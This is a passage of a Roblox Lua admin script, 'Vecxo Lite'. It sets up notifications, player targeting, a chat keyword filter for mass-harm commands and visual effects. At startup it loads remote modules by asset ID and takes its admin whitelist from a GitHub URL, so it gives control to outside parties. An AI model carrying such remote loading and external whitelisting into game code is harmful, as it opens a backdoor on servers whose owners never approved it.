--[[

Vecxo By Vecko

latest update - 9/8/25

credits 2 cxo,dek,dizzy,tech, and kozy :-)

]]

if _G.vecxosadminloaded == true then
	warn("Vecxo Lite is already running!")
	return
end

_G.vecxosadminloaded = true

local startTime = os.time()
local version = "0.9"
local lastUpdate = "Sept 8, 2025"
local activeNotifs = {}
local activeNotifz = {}
local TweenService = game:GetService("TweenService")

function notifyv3(player, title, message)
	task.spawn(function()
		local playerGui = player:WaitForChild("PlayerGui")
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = "VecxoHintGui"
		screenGui.ResetOnSpawn = false
		screenGui.Parent = playerGui

		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(0, 300, 0, 80)
		frame.AnchorPoint = Vector2.new(1, 1)
		frame.Position = UDim2.new(1, -20, 1, -20)
		frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		frame.BackgroundTransparency = 0.6
		frame.BorderSizePixel = 0
		frame.Parent = screenGui
		frame.ClipsDescendants = true
		frame.AutomaticSize = Enum.AutomaticSize.Y

		local titleLabel = Instance.new("TextLabel")
		titleLabel.Size = UDim2.new(1, -20, 0, 30)
		titleLabel.Position = UDim2.new(0, 10, 0, 10)
		titleLabel.BackgroundTransparency = 1
		titleLabel.Text = title
		titleLabel.Font = Enum.Font.GothamBold
		titleLabel.TextSize = 20
		titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		titleLabel.TextXAlignment = Enum.TextXAlignment.Left
		titleLabel.Parent = frame

		local messageLabel = Instance.new("TextLabel")
		messageLabel.Size = UDim2.new(1, -20, 0, 40)
		messageLabel.Position = UDim2.new(0, 10, 0, 40)
		messageLabel.BackgroundTransparency = 1
		messageLabel.Text = message
		messageLabel.Font = Enum.Font.Gotham
		messageLabel.TextSize = 16
		messageLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
		messageLabel.TextWrapped = true
		messageLabel.TextXAlignment = Enum.TextXAlignment.Left
		messageLabel.TextYAlignment = Enum.TextYAlignment.Top
		messageLabel.Parent = frame

		frame.BackgroundTransparency = 1
		titleLabel.TextTransparency = 1
		messageLabel.TextTransparency = 1

		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

		TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 0.6}):Play()
		TweenService:Create(titleLabel, tweenInfo, {TextTransparency = 0}):Play()
		TweenService:Create(messageLabel, tweenInfo, {TextTransparency = 0}):Play()

		activeNotifz[player] = activeNotifz[player] or {}
		table.insert(activeNotifz[player], 1, screenGui) -- newest goes first

		if #activeNotifz[player] > 3 then
			local oldest = activeNotifz[player][#activeNotifz[player]]
			if oldest and oldest.Parent then
				oldest:Destroy()
			end
			table.remove(activeNotifz[player], #activeNotifz[player])
		end

		for i, notif in ipairs(activeNotifz[player]) do
			if notif and notif:FindFirstChildOfClass("Frame") then
				local frameObj = notif:FindFirstChildOfClass("Frame")
				local targetPos = UDim2.new(1, -20, 1, -(20 + ((i - 1) * 90))) -- stack upward
				TweenService:Create(frameObj, TweenInfo.new(0.3), {Position = targetPos}):Play()
			end
		end

		task.delay(4, function()
			if screenGui and screenGui.Parent then
				TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 1}):Play()
				TweenService:Create(titleLabel, tweenInfo, {TextTransparency = 1}):Play()
				TweenService:Create(messageLabel, tweenInfo, {TextTransparency = 1}):Play()
				task.delay(0.5, function()
					if screenGui and screenGui.Parent then
						screenGui:Destroy()
						for i, gui in ipairs(activeNotifz[player]) do
							if gui == screenGui then
								table.remove(activeNotifz[player], i)
								break
							end
						end
						for i, notif in ipairs(activeNotifz[player]) do
							if notif and notif:FindFirstChildOfClass("Frame") then
								local frameObj = notif:FindFirstChildOfClass("Frame")
								local targetPos = UDim2.new(1, -20, 1, -(20 + ((i - 1) * 90)))
								TweenService:Create(frameObj, TweenInfo.new(0.3), {Position = targetPos}):Play()
							end
						end
					end
				end)
			end
		end)
	end)
end

local gc = false

if game.PlaceId == 14747334292 then
	if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
		require(112691275102014).load()
	end
	gc = true
end

local varName
local varName2
local gamegoog

if gc then
	varName2 = "üè† KAH Module"
	varName = "goog"
	gamegoog = 112691275102014
else
	varName2 = "üåç Universal Module"
	varName = "Epic"
	gamegoog = 88532011070135
end


local exclusivewl = {"Reloxz", "Dekryptionite", "t_echr", "cxotus", "Trogdor973", "Palamode", "Korabi20", "1x3x3x7x1x7", "DeportedImported"}

for i, v in pairs(game.Players:GetPlayers()) do
	if table.find(exclusivewl, v.Name) then
		notifyv3(v, "[Vecxo Lite]: ", "‚úÖ Loading Vecxo Lite...")
		if game.PlaceId == 14747334292 then
			notifyv3(v, "[Vecxo Lite]: ", "‚úÖ KAH Compatibility - "..tostring(gc).." | Module selected - "..varName2)
		else
			notifyv3(v, "[Vecxo Lite]: ", "‚ö†Ô∏è KAH Compatibility - "..tostring(gc).." | Module selected - "..varName2)
		end
	end
end

if not gc then
	require(gamegoog).load()
end

local cxoURL = "https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/whitelisted"
local BackupIDs = {
	-- cxo
	3222470105;
	7306448629;
	21517314;
	35950257;
	-- tech
	1702851506;
	-- knocks
	1551416114;
	-- kozy
	1889958;
	-- decryptionite
	120983992;
	1921860822;
	366631664;
	13425405;
	-- palamode
	523322320;
	-- freddie
	1724769699;
	--vecko
	244903894;
	36373784;
}

function GetWhitelist()
	local returnedUsers = {}
	local success, response = pcall(function()
		return game:GetService("HttpService"):GetAsync(cxoURL)
	end)
	if success and response then
		returnedUsers = string.split(response, "\n")
	else
		print("GitHub check failed! Using backup table.")
		returnedUsers = BackupIDs
	end
	return returnedUsers
end

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local whitelisted = GetWhitelist()
local vecxoconnections = {}
local bannedPlayers = {}
local bannedNameLookup = {}
local chatHistory = {}
local AutoUnpunish = {}
local afk = {}
local gcon = {}
local gmodded = {}
GraphicalEffects = {};
local loggingPlayers = {}
local AutoRespawn = {}
local AntiExePlayers = {}
local synapsex = {}
local OriginalMap = {}
local TweenService = game:GetService("TweenService")
local ServerStorage = game:GetService("ServerStorage")
local countries = {["BD"] = "Bangladesh", ["BE"] = "Belgium", ["BF"] = "Burkina Faso", ["BG"] = "Bulgaria", ["BA"] = "Bosnia and Herzegovina", ["BB"] = "Barbados", ["WF"] = "Wallis and Futuna", ["BL"] = "Saint Barthelemy", ["BM"] = "Bermuda", ["BN"] = "Brunei", ["BO"] = "Bolivia", ["BH"] = "Bahrain", ["BI"] = "Burundi", ["BJ"] = "Benin", ["BT"] = "Bhutan", ["JM"] = "Jamaica", ["BV"] = "Bouvet Island", ["BW"] = "Botswana", ["WS"] = "Samoa", ["BQ"] = "Bonaire, Saint Eustatius and Saba ", ["BR"] = "Brazil", ["BS"] = "Bahamas", ["JE"] = "Jersey", ["BY"] = "Belarus", ["BZ"] = "Belize", ["RU"] = "Russia", ["RW"] = "Rwanda", ["RS"] = "Serbia", ["TL"] = "East Timor", ["RE"] = "Reunion", ["TM"] = "Turkmenistan", ["TJ"] = "Tajikistan", ["RO"] = "Romania", ["TK"] = "Tokelau", ["GW"] = "Guinea-Bissau", ["GU"] = "Guam", ["GT"] = "Guatemala", ["GS"] = "South Georgia and the South Sandwich Islands", ["GR"] = "Greece", ["GQ"] = "Equatorial Guinea", ["GP"] = "Guadeloupe", ["JP"] = "Japan", ["GY"] = "Guyana", ["GG"] = "Guernsey", ["GF"] = "French Guiana", ["GE"] = "Georgia", ["GD"] = "Grenada", ["GB"] = "United Kingdom", ["GA"] = "Gabon", ["SV"] = "El Salvador", ["GN"] = "Guinea", ["GM"] = "Gambia", ["GL"] = "Greenland", ["GI"] = "Gibraltar", ["GH"] = "Ghana", ["OM"] = "Oman", ["TN"] = "Tunisia", ["JO"] = "Jordan", ["HR"] = "Croatia", ["HT"] = "Haiti", ["HU"] = "Hungary", ["HK"] = "Hong Kong", ["HN"] = "Honduras", ["HM"] = "Heard Island and McDonald Islands", ["VE"] = "Venezuela", ["PR"] = "Puerto Rico", ["PS"] = "Palestinian Territory", ["PW"] = "Palau", ["PT"] = "Portugal", ["SJ"] = "Svalbard and Jan Mayen", ["PY"] = "Paraguay", ["IQ"] = "Iraq", ["PA"] = "Panama", ["PF"] = "French Polynesia", ["PG"] = "Papua New Guinea", ["PE"] = "Peru", ["PK"] = "Pakistan", ["PH"] = "Philippines", ["PN"] = "Pitcairn", ["PL"] = "Poland", ["PM"] = "Saint Pierre and Miquelon", ["ZM"] = "Zambia", ["EH"] = "Western Sahara", ["EE"] = "Estonia", ["EG"] = "Egypt", ["ZA"] = "South Africa", ["EC"] = "Ecuador", ["IT"] = "Italy", ["VN"] = "Vietnam", ["SB"] = "Solomon Islands", ["ET"] = "Ethiopia", ["SO"] = "Somalia", ["ZW"] = "Zimbabwe", ["SA"] = "Saudi Arabia", ["ES"] = "Spain", ["ER"] = "Eritrea", ["ME"] = "Montenegro", ["MD"] = "Moldova", ["MG"] = "Madagascar", ["MF"] = "Saint Martin", ["MA"] = "Morocco", ["MC"] = "Monaco", ["UZ"] = "Uzbekistan", ["MM"] = "Myanmar", ["ML"] = "Mali", ["MO"] = "Macao", ["MN"] = "Mongolia", ["MH"] = "Marshall Islands", ["MK"] = "Macedonia", ["MU"] = "Mauritius", ["MT"] = "Malta", ["MW"] = "Malawi", ["MV"] = "Maldives", ["MQ"] = "Martinique", ["MP"] = "Northern Mariana Islands", ["MS"] = "Montserrat", ["MR"] = "Mauritania", ["IM"] = "Isle of Man", ["UG"] = "Uganda", ["TZ"] = "Tanzania", ["MY"] = "Malaysia", ["MX"] = "Mexico", ["IL"] = "Israel", ["FR"] = "France", ["IO"] = "British Indian Ocean Territory", ["SH"] = "Saint Helena", ["FI"] = "Finland", ["FJ"] = "Fiji", ["FK"] = "Falkland Islands", ["FM"] = "Micronesia", ["FO"] = "Faroe Islands", ["NI"] = "Nicaragua", ["NL"] = "Netherlands", ["NO"] = "Norway", ["NA"] = "Namibia", ["VU"] = "Vanuatu", ["NC"] = "New Caledonia", ["NE"] = "Niger", ["NF"] = "Norfolk Island", ["NG"] = "Nigeria", ["NZ"] = "New Zealand", ["NP"] = "Nepal", ["NR"] = "Nauru", ["NU"] = "Niue", ["CK"] = "Cook Islands", ["XK"] = "Kosovo", ["CI"] = "Ivory Coast", ["CH"] = "Switzerland", ["CO"] = "Colombia", ["CN"] = "China", ["CM"] = "Cameroon", ["CL"] = "Chile", ["CC"] = "Cocos Islands", ["CA"] = "Canada", ["CG"] = "Republic of the Congo", ["CF"] = "Central African Republic", ["CD"] = "Democratic Republic of the Congo", ["CZ"] = "Czech Republic", ["CY"] = "Cyprus", ["CX"] = "Christmas Island", ["CR"] = "Costa Rica", ["CW"] = "Curacao", ["CV"] = "Cape Verde", ["CU"] = "Cuba", ["SZ"] = "Swaziland", ["SY"] = "Syria", ["SX"] = "Sint Maarten", ["KG"] = "Kyrgyzstan", ["KE"] = "Kenya", ["SS"] = "South Sudan", ["SR"] = "Suriname", ["KI"] = "Kiribati", ["KH"] = "Cambodia", ["KN"] = "Saint Kitts and Nevis", ["KM"] = "Comoros", ["ST"] = "Sao Tome and Principe", ["SK"] = "Slovakia", ["KR"] = "South Korea", ["SI"] = "Slovenia", ["KP"] = "North Korea", ["KW"] = "Kuwait", ["SN"] = "Senegal", ["SM"] = "San Marino", ["SL"] = "Sierra Leone", ["SC"] = "Seychelles", ["KZ"] = "Kazakhstan", ["KY"] = "Cayman Islands", ["SG"] = "Singapore", ["SE"] = "Sweden", ["SD"] = "Sudan", ["DO"] = "Dominican Republic", ["DM"] = "Dominica", ["DJ"] = "Djibouti", ["DK"] = "Denmark", ["VG"] = "British Virgin Islands", ["DE"] = "Germany", ["YE"] = "Yemen", ["DZ"] = "Algeria", ["US"] = "United States", ["UY"] = "Uruguay", ["YT"] = "Mayotte", ["UM"] = "United States Minor Outlying Islands", ["LB"] = "Lebanon", ["LC"] = "Saint Lucia", ["LA"] = "Laos", ["TV"] = "Tuvalu", ["TW"] = "Taiwan", ["TT"] = "Trinidad and Tobago", ["TR"] = "Turkey", ["LK"] = "Sri Lanka", ["LI"] = "Liechtenstein", ["LV"] = "Latvia", ["TO"] = "Tonga", ["LT"] = "Lithuania", ["LU"] = "Luxembourg", ["LR"] = "Liberia", ["LS"] = "Lesotho", ["TH"] = "Thailand", ["TF"] = "French Southern Territories", ["TG"] = "Togo", ["TD"] = "Chad", ["TC"] = "Turks and Caicos Islands", ["LY"] = "Libya", ["VA"] = "Vatican", ["VC"] = "Saint Vincent and the Grenadines", ["AE"] = "United Arab Emirates", ["AD"] = "Andorra", ["AG"] = "Antigua and Barbuda", ["AF"] = "Afghanistan", ["AI"] = "Anguilla", ["VI"] = "U.S. Virgin Islands", ["IS"] = "Iceland", ["IR"] = "Iran", ["AM"] = "Armenia", ["AL"] = "Albania", ["AO"] = "Angola", ["AQ"] = "Antarctica", ["AS"] = "American Samoa", ["AR"] = "Argentina", ["AU"] = "Australia", ["AT"] = "Austria", ["AW"] = "Aruba", ["IN"] = "India", ["AX"] = "Aland Islands", ["AZ"] = "Azerbaijan", ["IE"] = "Ireland", ["ID"] = "Indonesia", ["UA"] = "Ukraine", ["QA"] = "Qatar", ["MZ"] = "Mozambique"}
local TweenService = game:GetService("TweenService")
local assetNameCache = {}
local warnings = {}
local playerConnections = {}
local permBannedPlayers = {}
local authTokens = {}
local antialtEnabled = false
local AdonisRan = false
local MapProtection = false
local AdonisRunner = nil
local serverprotection = false
local debrisProtectionRunning = false
local scriptrunning = false
_G.cagedPlayers = _G.cagedPlayers or {}
_G.antiloud = false
local mapBackup = Instance.new("Folder")
mapBackup.Name = "MapBackup"
mapBackup.Parent = ServerStorage


local function notify(player, title, message, timer)
	coroutine.wrap(function()
		local playerGui = player:FindFirstChildOfClass("PlayerGui")
		if not playerGui then return end
		timer = timer or 5
		local gui = Instance.new("ScreenGui")
		gui.Name = "AdminNotification"
		gui.ResetOnSpawn = false
		gui.IgnoreGuiInset = true
		gui.Parent = playerGui

		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(0.4, 0, 0.2, 0)
		frame.Position = UDim2.new(0.5, 0, 0.1, 0) 
		frame.AnchorPoint = Vector2.new(0.5, 0)
		frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Parent = gui

		local titleLabel = Instance.new("TextLabel")
		titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
		titleLabel.BackgroundTransparency = 1
		titleLabel.TextTransparency = 1
		titleLabel.TextStrokeTransparency = 1
		titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		titleLabel.Font = Enum.Font.Code
		titleLabel.TextScaled = true
		titleLabel.Text = title
		titleLabel.Parent = frame

		local messageLabel = Instance.new("TextLabel")
		messageLabel.Size = UDim2.new(1, 0, 0.7, 0)
		messageLabel.Position = UDim2.new(0, 0, 0.3, 0)
		messageLabel.BackgroundTransparency = 1
		messageLabel.TextTransparency = 1
		messageLabel.TextStrokeTransparency = 1
		messageLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
		messageLabel.Font = Enum.Font.Code
		messageLabel.TextScaled = true
		messageLabel.TextWrapped = true
		messageLabel.Text = message
		messageLabel.Parent = frame

		activeNotifs[player] = activeNotifs[player] or {}
		table.insert(activeNotifs[player], 1, gui) 

		if #activeNotifs[player] > 2 then
			local oldest = activeNotifs[player][#activeNotifs[player]]
			if oldest and oldest.Parent then
				oldest:Destroy()
			end
			table.remove(activeNotifs[player], #activeNotifs[player])
		end

		for i, notif in ipairs(activeNotifs[player]) do
			if notif and notif:FindFirstChildOfClass("Frame") then
				local frameObj = notif:FindFirstChildOfClass("Frame")
				local targetPos = UDim2.new(0.5, 0, 0.1 + ((i - 1) * 0.22), 0)
				TweenService:Create(frameObj, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = targetPos}):Play()
			end
		end

		local fadeInTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		TweenService:Create(frame, fadeInTweenInfo, { BackgroundTransparency = 0.2 }):Play()
		TweenService:Create(titleLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()
		TweenService:Create(messageLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()

		task.delay(timer, function()
			if gui and gui.Parent then
				local fadeOutTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
				TweenService:Create(frame, fadeOutTweenInfo, { BackgroundTransparency = 1 }):Play()
				TweenService:Create(titleLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
				TweenService:Create(messageLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
				task.wait(0.5)
				if gui and gui.Parent then
					gui:Destroy()
					for i, g in ipairs(activeNotifs[player]) do
						if g == gui then
							table.remove(activeNotifs[player], i)
							break
						end
					end
					for i, notif in ipairs(activeNotifs[player]) do
						if notif and notif:FindFirstChildOfClass("Frame") then
							local frameObj = notif:FindFirstChildOfClass("Frame")
							local targetPos = UDim2.new(0.5, 0, 0.1 + ((i - 1) * 0.22), 0)
							TweenService:Create(frameObj, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = targetPos}):Play()
						end
					end
				end
			end
		end)
	end)()
end

local function getSoundNameFromId(soundId)
	local assetId = tonumber(string.match(soundId, "%d+"))
	if not assetId then return nil end

	if assetNameCache[assetId] then
		return assetNameCache[assetId]
	end

	local success, result = pcall(function()
		return game:GetService("MarketplaceService"):GetProductInfo(assetId)
	end)

	if success and result and result.Name then
		assetNameCache[assetId] = result.Name
		return result.Name
	else
		return nil
	end
end

function GetPlayers(targetStr, me)
	local ps = game.Players:GetPlayers()
	local found = {}
	local function addPlayersFromSelector(sel, addMode)
		local list = {}
		sel = sel:lower()
		if sel == "me" then
			list = {me}
		elseif sel == "others" then
			for _, plr in ipairs(ps) do
				if plr ~= me then
					table.insert(list, plr)
				end
			end
		elseif sel == "friends" then
			for _, plr in ipairs(ps) do
				if plr ~= me and plr:IsFriendsWith(me.UserId) then
					table.insert(list, plr)
				end
			end
		elseif sel == "all" then
			list = ps
		elseif sel == "random" then
			if #ps > 0 then
				list = {ps[math.random(1, #ps)]}
			end
		else
			for _, plr in ipairs(ps) do
				if plr.Name:lower():sub(1, #sel) == sel or plr.DisplayName:lower():sub(1, #sel) == sel then
					table.insert(list, plr)
				end
			end
		end
		if addMode then
			for _, p in ipairs(list) do
				if not table.find(found, p) then
					table.insert(found, p)
				end
			end
		else
			for _, p in ipairs(list) do
				local idx = table.find(found, p)
				if idx then
					table.remove(found, idx)
				end
			end
		end
	end
	local selectors = {}
	for sel in string.gmatch(targetStr or "", "[^,%s]+") do
		table.insert(selectors, sel)
	end
	if #selectors == 0 then
		return {me}
	end
	for i, sel in ipairs(selectors) do
		local mode = true
		if sel:sub(1, 1) == "+" then
			mode = true
			sel = sel:sub(2)
		elseif sel:sub(1, 1) == "-" then
			mode = false
			sel = sel:sub(2)
		elseif i == 1 then
			found = {}
			mode = true
		end
		addPlayersFromSelector(sel, mode)
	end
	return found
end

local function pseudoHash(str)
	local hash = 0
	for i = 1, #str do
		hash = (hash * 31 + string.byte(str, i)) % 2^32
	end
	return string.format("%08x", hash)
end

local function generateToken()
	local seedData = tostring(math.random(100000, 999999)) ..
		tostring(os.clock()) ..
		tostring(tick()) ..
		tostring(math.random())
	return pseudoHash(seedData) .. pseudoHash(seedData:reverse())
end

local TokenRemote = game.ReplicatedStorage:FindFirstChild("VecxoCommandToken")
if not TokenRemote then
	TokenRemote = Instance.new("RemoteEvent")
	TokenRemote.Name = "VecxoCommandToken"
	TokenRemote.Parent = game.ReplicatedStorage
end

local RemoteFunction = game.ReplicatedStorage:FindFirstChild("VecxoRequestToken")
if not RemoteFunction then
	RemoteFunction = Instance.new("RemoteFunction")
	RemoteFunction.Name = "VecxoRequestToken"
	RemoteFunction.Parent = game.ReplicatedStorage
end

local function logChatMessage(plr, msg)
	table.insert(chatHistory, {
		UserId = plr.UserId,
		Name = plr.Name,
		Message = msg
	})
end

local dangerousKeywords = {
	"kill all", "kill others", "punish all", "punish others",
	"fling all", "fling others", "rocket all", "rocket others",
	"kill/all", "kill/others", "rocket/all", "rocket/others", "explode all", "explode others", "explode/all",  "explode/others"
}

local function containsDangerousPhrase(message)
	message = message:lower()
	for _, phrase in ipairs(dangerousKeywords) do
		if string.find(message, phrase, 1, true) then
			return true
		end
	end
	return false
end

local function warnPlayer(player)
	local userId = player.UserId
	local count = warnings[userId] or 0
	count += 1
	warnings[userId] = count

	if count == 1 then
		task.spawn(function()
			GraphicalEffects.CrystalRing(player, "New Yeller", 3)
		end)
		notify(player,"[Vecxo Lite]:", "‚ö†Ô∏è Server protection is on\nYou are on your 1st warning. If you hit three, you will be automatically removed from the server.")
	else
		if count == 2 then
			task.spawn(function()
				GraphicalEffects.CrystalRing(player, "Really red", 5)
			end)
			if AutoRespawn[player.Name] then
				AutoRespawn[player.Name] = nil
			end
			if AutoUnpunish[player.Name] then
				AutoUnpunish[player.Name] = nil
			end
			notify(player,"[Vecxo Lite]:", "‚ö†Ô∏è Server protection is on\nYou now also lost your own server protection\n Lastly, you are on your 2nd warning. One more strike for abuse, you will be automatically removed from the server.")		
		end
	end
	if count >= 3 then
		task.spawn(function()
			GraphicalEffects.CrystalRing(player, "Really red", 3)
		end)
		local message = Instance.new("Hint", workspace)
		message.Text = "[Vecxo Lite]: ‚úÖ Server protection automatically banned "..player.Name.." for abusing, three strikes were counted."
		player:Kick("[BANNED] by [Vecxo Lite]:  for\nYou have been banned for repeated use of harmful commands.")
		bannedPlayers[player.UserId] = true
		task.spawn(function()
			task.wait(7)
			message:Destroy()
		end)
	end
end

local function onPlayerChatted(player, message)
	if not serverprotection then return end
	if containsDangerousPhrase(message) then
		warnPlayer(player)
	end
end

local function setupPlayer(player)
	if playerConnections[player.UserId] then
		playerConnections[player.UserId]:Disconnect()
	end
	playerConnections[player.UserId] = player.Chatted:Connect(function(message)
		onPlayerChatted(player, message)
	end)
end

local function cleanupConnections()
	for userId, conn in pairs(playerConnections) do
		if conn then
			conn:Disconnect()
		end
	end
	playerConnections = {}
end

local function refreshPlayer(plr)
	if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
		local rnpos = plr.Character.HumanoidRootPart.CFrame

		for _, v in ipairs(plr.Character:GetChildren()) do
			if v:IsA("Accessory") then
				pcall(function()
					v:Destroy()
				end)
			end
		end

		for _, item in ipairs(workspace:GetDescendants()) do
			if (item:IsA("Accessory") or item:IsA("Hat")) and item:FindFirstChild("Handle") and item.Handle:IsDescendantOf(workspace) then
				if item.Name == plr.Name or item.Handle.Name == plr.Name then
					pcall(function()
						item:Destroy()
					end)
				end
			end
		end

		plr:LoadCharacter()
		task.wait()
		if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
			plr.Character.HumanoidRootPart.CFrame = rnpos
		end
	else
		plr:LoadCharacter()
	end
end

function Lightning(Start,End,Times,Offset,Color,Thickness,Transparency) --//OLD Ass Script Builder Func
	local magz = (Start - End).magnitude local curpos = Start local trz = {-Offset,Offset}
	for i=1,Times do 
		local li = Instance.new("Part",workspace) li.TopSurface =0 li.BottomSurface = 0 li.Anchored = true  li.Transparency = Transparency or 0.4 li.BrickColor = BrickColor.new(Color)
		li.formFactor = "Custom" li.CanCollide = false li.Size = Vector3.new(Thickness,Thickness,magz/Times) local ofz = Vector3.new(trz[math.random(1,2)],trz[math.random(1,2)],trz[math.random(1,2)]) 
		function touch(hit) 
			if hit.Parent:FindFirstChild("Humanoid") ~= nil then 
				hit.Parent:BreakJoints()
				local s = Instance.new("Sound")
				s.SoundId = "rbxassetid://1079408535"
				s.Volume = 1
				s.PlayOnRemove = true
				s.Parent = hit.Parent:FindFirstChild("Head") or hit.Parent
				s:Destroy()
			end 
		end 
		li.Touched:Connect(touch)
		local trolpos = CFrame.new(curpos,End)*CFrame.new(0,0,magz/Times).p+ofz
		if Times == i then 
			local magz2 = (curpos - End).magnitude li.Size = Vector3.new(Thickness,Thickness,magz2)
			li.CFrame = CFrame.new(curpos,End)*CFrame.new(0,0,-magz2/2)
		else
			li.CFrame = CFrame.new(curpos,trolpos)*CFrame.new(0,0,magz/Times/2)
		end
		curpos = li.CFrame*CFrame.new(0,0,magz/Times/2).p game.Debris:AddItem(li,0.25)
	end
end

local TweenService = game:GetService("TweenService")

local imageIds = {
	coolface = "6039299999",
	cry = "13197829717",
	gunface = "966366467",
	popface = "14450880332",
	flushed = "6361629362",
	cracked = "8642281672",
	lolface = "16890042822",
	adore = "9868700627",
	gay = "5192693052",
	crysun = "14225236297",
	chitter = "103341444229833",
	woahface = "18525450668",
	sillycat = "18525375311",
	woahcat = "9276018925",
	maxwell = "11914981726",
	memecat = "4575171283",
	lick = "10670510697",
	devilcat = "8477956665",
	anothacat = "10824339328",
	cat2 = "2058983",
	madkitty = "29347006",
	armykitty = "47771192",
	gamer = "192608797",
	gamerr = "11154422902",
	catmilk = "7220505716",
	omgitsme = "10583059099",
	rahhhhh = "78969294",
	cutecat = "180355555",
	pointnlaugh = "18935448555",
	thunk = "7227513519",
	rizz = "13176191458",
	chad = "14568388433",
	yep = "7970460667",
	angy = "16023922633",
	cmere = "6317749703",
	nerd = "18596283057",
	whyy = "18935703234",
	sobv2 = "10252552852",
	squidwar = "258816537",
	squidmax = "113694969",
}

local function getRandomImageId()
	local keys = {}
	for k in pairs(imageIds) do
		table.insert(keys, k)
	end
	local randKey = keys[math.random(#keys)]
	return imageIds[randKey]
end

function GraphicalEffects.CrystalRing(Player, Color, Duration, RainbowMode)
	RainbowMode = RainbowMode or false
	if not Player.Character or not Player.Character:FindFirstChild("HumanoidRootPart") then return end

	local crystal_count = 10
	local crystal_color = BrickColor.new(""..Color.."")
	local crystal_scale = Vector3.new(2 / 3, 2, 2 / 3)
	local radius = 1.25 * crystal_count / math.pi
	local spawn_duration = 0.065
	local full_spawn_duration = spawn_duration * crystal_count
	local float_duration = tonumber(Duration)
	local wave_amplitude = 0.5
	local wave_period = 1
	local appear_duration = 0.1
	local disappear_duration = 0.5
	local base_part = Player.Character.HumanoidRootPart
	local offset_cframe = CFrame.new()

	local crystal_template = Instance.new("Part")
	crystal_template.Anchored = true
	crystal_template.Locked = true
	crystal_template.CanCollide = false
	crystal_template.BottomSurface = "Smooth"
	crystal_template.TopSurface = "Smooth"
	crystal_template.Color = crystal_color.Color
	crystal_template.Size = Vector3.new(1, 1, 1)

	local crystal_light = Instance.new("PointLight", crystal_template)
	crystal_light.Brightness = 0.1 / crystal_count
	crystal_light.Color = crystal_color.Color
	crystal_light.Range = radius
	crystal_light.Shadows = true

	local crystal_mesh = Instance.new("SpecialMesh", crystal_template)
	crystal_mesh.MeshId = "rbxassetid://9756362"
	crystal_mesh.MeshType = "FileMesh"
	crystal_mesh.Scale = crystal_scale

	local crystal_model = Instance.new("Model")
	crystal_model.Archivable = false
	crystal_model.Name = "Crystal Model"
	crystal_model.Parent = workspace

	local crystals, lights, meshes = {}, {}, {}
	for index = 1, crystal_count do
		local crystal = crystal_template:Clone()
		crystal.Parent = crystal_model
		crystals[index] = crystal
		lights[index] = crystal:FindFirstChildOfClass("PointLight")
		meshes[index] = crystal:FindFirstChildOfClass("SpecialMesh")
	end

	local start_time = tick()
	repeat
		local base_cframe = base_part and (base_part.CFrame * offset_cframe) or offset_cframe
		local elapsed_time = tick() - start_time

		for index, crystal in ipairs(crystals) do
			local crystal_time = elapsed_time - index * spawn_duration
			local disappear_time = crystal_time - float_duration
			local offset

			if crystal_time < 0 then
				offset = 0
			elseif crystal_time < appear_duration then
				offset = radius * crystal_time / appear_duration
			else
				offset = radius
			end

			if disappear_time >= 0 then
				local disappear_progress = disappear_time / disappear_duration
				if disappear_progress > 1 then
					if crystal.Parent then crystal:Destroy() end
				else
					local inverse_progress = 1 - disappear_progress
					local mesh = meshes[index]
					lights[index].Brightness = 2 * inverse_progress
					lights[index].Range = 2 * radius
					mesh.Scale = crystal_scale * inverse_progress

					if RainbowMode then
						local hue = ((elapsed_time * 0.25) + (index / crystal_count)) % 1
						local col = Color3.fromHSV(hue, 1, 1 - inverse_progress)
						crystal.Color = col
						lights[index].Color = col
					else
						local col = crystal_color.Color:lerp(Color3.new(0, 0, 0), disappear_progress)
						crystal.Color = col
						lights[index].Color = col
					end
				end
			else
				local wave_offset = wave_amplitude * math.sin(math.pi * 2 * (elapsed_time - index / crystal_count * 3) / wave_period)
				if RainbowMode then
					local col = Color3.new(0, 0, 0)
					crystal.Color = col
					lights[index].Color = col
				else
					crystal.Color = crystal_color.Color
					lights[index].Color = crystal_color.Color
				end

				local rotation_angle = (tick() * 0.5 + (index - 1) / crystal_count) % 1 * math.pi * 2
				crystal.CFrame = base_cframe * CFrame.Angles(0, rotation_angle, 0) * CFrame.new(0, wave_offset, -offset)
			end
		end

		game:GetService("RunService").Stepped:Wait()
	until elapsed_time >= float_duration + full_spawn_duration + disappear_duration

	if crystal_model.Parent then
		crystal_model:Destroy()
	end
end

if not game.ReplicatedStorage:FindFirstChild("VecxoCommandEvent") then
	local remote = Instance.new("RemoteEvent")
	remote.Name = "VecxoCommandEvent"
	remote.Parent = game.ReplicatedStorage
	print("VecxoCommandEvent created")
end

local chatRemote = game.ReplicatedStorage:FindFirstChild("VecxoChatRemote")
if not chatRemote then
	chatRemote = Instance.new("RemoteEvent")
